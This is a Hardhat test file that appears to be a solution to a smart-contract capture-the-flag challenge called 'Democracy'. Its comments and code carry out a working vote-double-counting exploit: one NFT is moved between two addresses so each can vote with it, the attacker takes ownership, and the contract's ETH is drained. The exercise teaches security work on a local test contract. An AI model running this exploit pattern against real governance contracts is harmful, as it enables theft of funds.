const {
  time,
  loadFixture,
} = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
const { ethers } = require("hardhat");

const NAME = "Democracy";

describe(NAME, function () {
  async function setup() {
      const [owner, attackerWallet,plusAddress] = await ethers.getSigners();
      const value = ethers.utils.parseEther("1");

      const VictimFactory = await ethers.getContractFactory(NAME);
      const victimContract = await VictimFactory.deploy({ value });

      return { victimContract, attackerWallet,plusAddress};
  }

  describe("exploit", async function () {
      let victimContract, attackerWallet;
      before(async function () {
          ({ victimContract, attackerWallet,plusAddress } = await loadFixture(setup));
      })

      it("conduct your attack here", async function () {

        /**
         * The hidden cheating logic of this contact is the challanger will get 3 votes and two nft and the incumbent will get 5 votes when one become the challenger.
         * Another hidden logic is only the chanlleger's vote is greater than incumbent, then the challenger can break the contract. 
         * So it semms that the challenger's votes will forever less than the incumbent's votes because even adding two nft's votes, the chanllenger's votes just equal the 
         * incumbent's votes. 
         * 
         * But if the challanger transfer one nft to another address, which vote the challenger, now the challenger's votes euqal 4. 
         * The next step, another address transfer back the nft to chanllenger. Now the challenger votes itself, So 4+2 will bigger than 5 and all votes bigger than TOTAL_SUPPLY_CAP(10)
         * Now, the chanllenger will become owner, then can withdraw all this contract's eth balance.
         * 
         * 
         */
        // attackerWallet become chanllenger, now have two votes and two NFT
        await victimContract.nominateChallenger(attackerWallet.address);
        
        // transfer one NFT to plusAddress and let plusAddress vote for attackerWallet, Now chanllenger have 4 votes
        await victimContract.connect(attackerWallet).transferFrom(attackerWallet.address,plusAddress.address,0);
        await victimContract.connect(plusAddress).vote(attackerWallet.address);  

        // plusAddress transfer back the nft to attackerWallet
        await victimContract.connect(plusAddress).transferFrom(plusAddress.address,attackerWallet.address,0);

        // Now chanllenger still have two nft, vote for itself, Noe chanllenger have 6 votes, and bigger than incumbent
        await victimContract.connect(attackerWallet).vote(attackerWallet.address); // 4+ 2 votes

        // // after the above vote, attackerWallet become the owner, now just withdraw
        await victimContract.connect(attackerWallet).withdrawToAddress(attackerWallet.address);
       
      });

      after(async function () {
          const victimContractBalance = await ethers.provider.getBalance(victimContract.address);
          expect(victimContractBalance).to.be.equal('0');
      });
  });
});